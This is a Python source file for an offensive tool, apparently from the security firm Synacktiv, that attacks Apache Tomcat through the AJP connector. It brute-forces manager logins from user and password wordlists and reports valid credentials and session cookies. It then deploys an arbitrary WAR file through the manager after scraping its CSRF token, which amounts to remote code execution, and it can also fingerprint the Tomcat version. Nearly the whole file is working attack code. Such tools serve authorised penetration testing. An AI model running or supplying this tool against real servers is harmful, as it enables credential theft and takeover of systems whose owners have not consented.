#!/usr/bin/env python
#
# Julien Legras - Synacktiv
#
# THIS SOFTWARE IS PROVIDED BY SYNACKTIV ''AS IS'' AND ANY
# EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
# DISCLAIMED. IN NO EVENT SHALL SYNACKTIV BE LIABLE FOR ANY
# DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
# (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
# ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

from ajpy.ajp import AjpResponse, AjpForwardRequest, AjpBodyRequest, NotFoundException
from pprint import pprint, pformat

import socket
import argparse
import logging
import re
import os
from StringIO import StringIO
import logging
from colorlog import ColoredFormatter

def setup_logger():
    """Return a logger with a default ColoredFormatter."""
    formatter = ColoredFormatter(
        "[%(asctime)s.%(msecs)03d] %(log_color)s%(levelname)-8s%(reset)s %(white)s%(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
        reset=True,
        log_colors={
            'DEBUG':    'bold_purple',
            'INFO':     'bold_green',
            'WARNING':  'bold_yellow',
            'ERROR':    'bold_red',
            'CRITICAL': 'bold_red',
        }
    )

    logger = logging.getLogger('meow')
    handler = logging.StreamHandler()
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    logger.setLevel(logging.DEBUG)

    return logger

logger = setup_logger()


# helpers
def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET):
	fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)
	fr.method = method
	fr.protocol = "HTTP/1.1"
	fr.req_uri = req_uri
	fr.remote_addr = target_host
	fr.remote_host = None
	fr.server_name = target_host
	fr.server_port = 80
	fr.request_headers = {
		'SC_REQ_ACCEPT': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'SC_REQ_CONNECTION': 'keep-alive',
		'SC_REQ_CONTENT_LENGTH': '0',
		'SC_REQ_HOST': target_host,
		'SC_REQ_USER_AGENT': 'Mozilla/5.0 (X11; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0',
		'Accept-Encoding': 'gzip, deflate, sdch',
		'Accept-Language': 'en-US,en;q=0.5',
		'Upgrade-Insecure-Requests': '1',
		'Cache-Control': 'max-age=0'
	}
	fr.is_ssl = False

	fr.attributes = []

	return fr


class Tomcat(object):
	def __init__(self, target_host, target_port):
		self.target_host = target_host
		self.target_port = target_port

		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		self.socket.connect((target_host, target_port))
		self.stream = self.socket.makefile("rb", bufsize=0)


	def test_password(self, user, password):
		res = False
		stop = False
		self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic " + ("%s:%s" % (user, password)).encode('base64').replace('\n', '')
		while not stop:
			logger.debug("testing %s:%s" % (user, password))
			responses = self.forward_request.send_and_receive(self.socket, self.stream)
			snd_hdrs_res = responses[0]
			if snd_hdrs_res.http_status_code == 404:
				raise NotFoundException("The req_uri %s does not exist!" % self.req_uri)
			elif snd_hdrs_res.http_status_code == 302:
				self.req_uri = snd_hdrs_res.response_headers.get('Location', '')
				logger.info("Redirecting to %s" % self.req_uri)
				self.forward_request.req_uri = self.req_uri
			elif snd_hdrs_res.http_status_code == 200:
				logger.info("Found valid credz: %s:%s" % (user, password))
				res = True
				stop = True
				if 'Set-Cookie' in snd_hdrs_res.response_headers:
					logger.info("Here is your cookie: %s" % (snd_hdrs_res.response_headers.get('Set-Cookie', '')))
			elif snd_hdrs_res.http_status_code == 403:
				logger.info("Found valid credz: %s:%s but the user is not authorized to access this resource" % (user, password))
				stop = True
			elif snd_hdrs_res.http_status_code == 401:
				stop = True

		return res

	def start_bruteforce(self, users, passwords, req_uri, autostop):
		logger.info("Attacking a tomcat at ajp13://%s:%d%s" % (self.target_host, self.target_port, req_uri))
		self.req_uri = req_uri
		self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri)
 	 
		f_users = open(users, "r")
		f_passwords = open(passwords, "r")

		valid_credz = []
		try:
			for user in f_users:
				f_passwords.seek(0, 0)
				for password in f_passwords:
					if autostop and len(valid_credz) > 0:
						self.socket.close()
						return valid_credz

					user = user.rstrip('\n')
					password = password.rstrip('\n')
					if self.test_password(user, password):
						valid_credz.append((user, password))
		except NotFoundException as e:
			logger.fatal(e.message)
		finally:
			logger.debug("Closing socket...")
			self.socket.close()
			return valid_credz


	def perform_request(self, req_uri, headers={}, method='GET', user=None, password=None, attributes=[]):
		self.req_uri = req_uri
		self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))
		logger.debug("Getting resource at ajp13://%s:%d%s" % (self.target_host, self.target_port, req_uri))
		if user is not None and password is not None:
			self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic " + ("%s:%s" % (user, password)).encode('base64').replace('\n', '')

		for h in headers:
			self.forward_request.request_headers[h] = headers[h]

		for a in attributes:
			self.forward_request.attributes.append(a)

		responses = self.forward_request.send_and_receive(self.socket, self.stream)
		if len(responses) == 0:
			return None, None

		snd_hdrs_res = responses[0]

		data_res = responses[1:-1]
		if len(data_res) == 0:
			logger.info("No data in response. Headers:\n %s" % pformat(vars(snd_hdrs_res)))

		return snd_hdrs_res, data_res

	def upload(self, filename, user, password, headers={}):
		# first we request the manager page to get the CSRF token 
		hdrs, rdata = self.perform_request("/manager/html", headers=headers, user=user, password=password)
		deploy_csrf_token = re.findall('(org.apache.catalina.filters.CSRF_NONCE=[0-9A-F]*)"', "".join([d.data for d in rdata]))
		if len(deploy_csrf_token) == 0:
			logger.critical("Failed to get CSRF token. Check the credentials")
			return

		logger.debug('CSRF token = %s' % deploy_csrf_token[0])


		with open(filename, "rb") as f_input:
			with open("/tmp/request", "w+b") as f:
				s_form_header = '------WebKitFormBoundaryb2qpuwMoVtQJENti\r\nContent-Disposition: form-data; name="deployWar"; filename="%s"\r\nContent-Type: application/octet-stream\r\n\r\n' % os.path.basename(filename)
				s_form_footer = '\r\n------WebKitFormBoundaryb2qpuwMoVtQJENti--\r\n'
				f.write(s_form_header)
				f.write(f_input.read())
				f.write(s_form_footer)
			
		data_len = os.path.getsize("/tmp/request")

		headers = {
				"SC_REQ_CONTENT_TYPE": "multipart/form-data; boundary=----WebKitFormBoundaryb2qpuwMoVtQJENti",
				"SC_REQ_CONTENT_LENGTH": "%d" % data_len,
				"SC_REQ_COOKIE": re.findall("(JSESSIONID=[0-9A-F]*); Path=/manager/; HttpOnly", hdrs.response_headers.get('Set-Cookie', ''))[0],
				"SC_REQ_REFERER": "http://%s/manager/html/" % (self.target_host),
				"Origin": "http://%s" % (self.target_host),
		}

		r = self.perform_request("/manager/html/deploy", headers=headers, method="POST", user=user, password=password, attributes=[{"name": "query_string", "value": deploy_csrf_token[0]}, {"name": "req_attribute", "value": ("JK_LB_ACTIVATION", "ACT")}, {"name": "req_attribute", "value": ("AJP_REMOTE_PORT", "12345")}])

		with open("/tmp/request", "rb") as f:
			br = AjpBodyRequest(f, 8186, AjpBodyRequest.SERVER_TO_CONTAINER)
			br.send_and_receive(self.socket, self.stream)

		r = AjpResponse.receive(self.stream)
		while r.prefix_code != AjpResponse.END_RESPONSE:
			if r.prefix_code == AjpResponse.SEND_BODY_CHUNK:
				print r.data
			r = AjpResponse.receive(self.stream)


	def get_error_page(self):
		return self.perform_request("/blablablablabla")

	def get_version(self):
		hdrs, data = self.get_error_page()
		for d in data:
			s = re.findall('(Apache Tomcat/[0-9\.]+) ', d.data)
			if len(s) > 0:
				return s[0]
		

if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	subparsers = parser.add_subparsers()

	parser.add_argument("target", type=str, help="Hostname or IP to attack")
	parser.add_argument("--port", type=int, default=8009, help="AJP port to attack (default is 8009)")
	parser.add_argument('-v', '--verbose', action='count', default=1)

	parser_bf = subparsers.add_parser('bf', help='Bruteforce Basic authentication')
	parser_bf.set_defaults(which='bf')
	parser_bf.add_argument("req_uri", type=str, default="/manager/html", help="Resource to attack")
	parser_bf.add_argument("-U", "--users", type=str, help="Filename containing the usernames to test against the Tomcat manager AJP", required=True)
	parser_bf.add_argument("-P", "--passwords", type=str, help="Filename containing the passwords to test against the Tomcat manager AJP", required=True)
	parser_bf.add_argument('-s', '--stop', action='store_true', default=False, help="Stop when we find valid credz")

#	parser_req = subparsers.add_parser('req', help='Request resource')
#	parser_req.set_defaults(which='req')
#	parser_req.add_argument("-m", "--method", type=str, default="GET", help="Request method (default=GET)", choices=AjpForwardRequest.REQUEST_METHODS.keys())

	parser_upload = subparsers.add_parser('upload', help='Upload WAR')
	parser_upload.set_defaults(which='upload')
	parser_upload.add_argument("filename", type=str, help="WAR file to upload")
	parser_upload.add_argument("-u", "--user", type=str, default=None, help="Username")
	parser_upload.add_argument("-p", "--password", type=str, default=None, help="Password")
	parser_upload.add_argument("-H", "--headers", type=str, default={}, help="Custom headers")

	parser_version = subparsers.add_parser('version', help='Get version')
	parser_version.set_defaults(which='version')

	args = parser.parse_args()


	if args.verbose == 1:
		logger.setLevel(logging.INFO)
	else:
		logger.setLevel(logging.DEBUG)

	bf = Tomcat(args.target, args.port)
	if args.which == 'bf':
		bf.start_bruteforce(args.users, args.passwords, args.req_uri, args.stop)
#	elif args.which == 'req':
#		print bf.perform_request(args.req_uri, args.headers, args.method, args.user, args.password)
	elif args.which == 'upload':
		bf.upload(args.filename, args.user, args.password, args.headers)
	elif args.which == 'version':	
		print bf.get_version()
